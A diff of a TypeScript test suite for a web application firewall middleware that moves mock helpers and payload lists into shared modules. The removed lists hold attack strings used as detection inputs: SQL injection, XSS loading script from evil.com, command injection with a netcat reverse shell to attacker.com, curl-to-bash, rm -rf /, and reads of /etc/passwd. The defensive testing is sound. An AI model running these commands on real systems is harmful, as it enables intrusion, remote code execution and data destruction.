@@ -4,7 +4,7 @@
  * Comprehensive test suite for Web Application Firewall functionality
  */
 
-import { Request, Response } from "express";
+import { Request } from "express";
 import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 
 import {
@@ -25,6 +25,16 @@ import {
   WAFRule,
 } from "./waf.middleware";
 
+import { createMockRequest, createMockResponse, type MockResponse } from "./__tests__/mocks";
+import {
+  sqlInjectionPayloads,
+  xssPayloads,
+  commandInjectionPayloads,
+  pathTraversalPayloads,
+  maliciousBots,
+  legitimatePayloads,
+} from "./__tests__/payloads";
+
 // Mock logger
 vi.mock("@/utils/logger", () => ({
   logger: {
@@ -41,45 +51,6 @@ vi.mock("@/config/env", () => ({
     NODE_ENV: "test",
   },
 }));
-
-// Helper to create mock request
-function createMockRequest(overrides: Partial<Request> = {}): Request {
-  return {
-    method: "GET",
-    path: "/api/test",
-    originalUrl: "/api/test",
-    body: {},
-    query: {},
-    headers: {
-      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    },
-    cookies: {},
-    ip: "192.168.1.100",
-    socket: { remoteAddress: "192.168.1.100" },
-    get: vi.fn((header: string) => {
-      if (header === "User-Agent") return overrides.headers?.["user-agent"] ?? "Mozilla/5.0";
-      return undefined;
-    }),
-    ...overrides,
-  } as unknown as Request;
-}
-
-type MockFn = ReturnType<typeof vi.fn>;
-type MockResponse = Response & {
-  json: MockFn;
-  setHeader: MockFn;
-  status: MockFn;
-};
-
-// Helper to create mock response
-function createMockResponse(): MockResponse {
-  const res = {
-    status: vi.fn().mockReturnThis(),
-    json: vi.fn().mockReturnThis(),
-    setHeader: vi.fn().mockReturnThis(),
-  };
-  return res as unknown as MockResponse;
-}
 
   beforeEach(() => {
     resetWAFConfig();
@@ -151,19 +122,6 @@ function createMockResponse(): MockResponse {
   });
 
   describe("SQL Injection Detection", () => {
-    const sqlInjectionPayloads = [
-      "SELECT * FROM users WHERE id=1",
-      "1' OR '1'='1",
-      "1; DROP TABLE users--",
-      "UNION SELECT username, password FROM users",
-      "admin'--",
-      "1' AND 1=1--",
-      "'; EXEC xp_cmdshell('dir')--",
-      "1' WAITFOR DELAY '0:0:10'--",
-      "1' ORDER BY 1--",
-      "BENCHMARK(10000000,SHA256('test'))",
-    ];
-
     it.each(sqlInjectionPayloads)(
       "should detect SQL injection: %s",
       (payload) => {
@@ -198,18 +156,6 @@ function createMockResponse(): MockResponse {
   });
 
   describe("XSS Detection", () => {
-    const xssPayloads = [
-      "<script>alert('xss')</script>",
-      "<img src=x onerror=alert('xss')>",
-      "javascript:alert('xss')",
-      "<svg onload=alert('xss')>",
-      "<body onload=alert('xss')>",
-      "<iframe src='javascript:alert(1)'>",
-      "<div style='background:url(javascript:alert(1))'>",
-      "'-alert(1)-'",
-      "<script src='https://evil.com/xss.js'></script>",
-    ];
-
     it.each(xssPayloads)("should detect XSS attack: %s", (payload) => {
       updateWAFConfig({ mode: "block" });
 
@@ -227,17 +173,6 @@ function createMockResponse(): MockResponse {
   });
 
   describe("Command Injection Detection", () => {
-    const commandInjectionPayloads = [
-      "; cat /etc/passwd",
-      "| ls -la",
-      "`whoami`",
-      "$(id)",
-      "&& rm -rf /",
-      "|| ping -c 10 evil.com",
-      "; nc -e /bin/sh attacker.com 4444",
-      "| curl https://evil.com/shell.sh | bash",
-    ];
-
     it.each(commandInjectionPayloads)(
       "should detect command injection: %s",
       (payload) => {
@@ -257,16 +192,6 @@ function createMockResponse(): MockResponse {
   });
 
   describe("Path Traversal Detection", () => {
-    const pathTraversalPayloads = [
-      "../../../etc/passwd",
-      "..\\..\\..\\windows\\system32\\config\\sam",
-      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-      "....//....//....//etc/passwd",
-      "/etc/passwd",
-      "/proc/self/environ",
-      "C:\\Windows\\System32\\",
-    ];
-
     it.each(pathTraversalPayloads)(
       "should detect path traversal: %s",
       (payload) => {
@@ -287,15 +212,6 @@ function createMockResponse(): MockResponse {
   });
 
   describe("Bot Detection", () => {
-    const maliciousBots = [
-      "sqlmap/1.0",
-      "Nikto/2.1.5",
-      "nmap scripting engine",
-      "masscan/1.0",
-      "gobuster/3.1",
-      "nuclei/2.0",
-    ];
-
     it.each(maliciousBots)("should detect malicious bot: %s", (botUA) => {
       updateWAFConfig({ mode: "block" });
 
@@ -648,17 +564,6 @@ function createMockResponse(): MockResponse {
   });
 
   describe("False Positive Prevention", () => {
-    const legitimatePayloads = [
-      "I want to select the best option from the list",
-      "The user dropped their phone",
-      "Insert the key into the lock",
-      "Update your profile settings",
-      "Delete old files from downloads",
-      "This is a script for a movie",
-      "Click here for more information",
-      "The image source is correct",
-    ];
-
     it.each(legitimatePayloads)(
       "should allow legitimate content: %s",
       (payload) => {
